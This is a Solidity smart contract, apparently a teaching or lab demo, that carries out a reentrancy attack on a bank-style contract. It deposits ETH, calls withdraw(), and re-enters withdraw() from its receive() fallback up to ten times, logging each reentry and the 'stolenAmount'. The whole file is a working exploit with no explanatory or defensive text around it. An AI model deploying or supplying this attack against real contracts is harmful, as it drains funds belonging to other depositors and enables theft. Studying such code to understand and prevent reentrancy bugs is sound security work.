// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IBank public target;
    uint256 public reentryCount;
    bool public attackInProgress;

    event AttackStarted(uint256 amount);
    event Reentered(uint256 count, uint256 victimBalance);
    event AttackFinished(uint256 stolenAmount);

    constructor(address _target) {
        target = IBank(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH");
        reentryCount = 0;
        attackInProgress = true;
        emit AttackStarted(msg.value);
        target.deposit{value: msg.value}();
        target.withdraw();
        attackInProgress = false;
        emit AttackFinished(address(this).balance);
    }

    receive() external payable {
        if (attackInProgress && reentryCount < 10) {
            reentryCount++;
            emit Reentered(reentryCount, address(target).balance);
            target.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
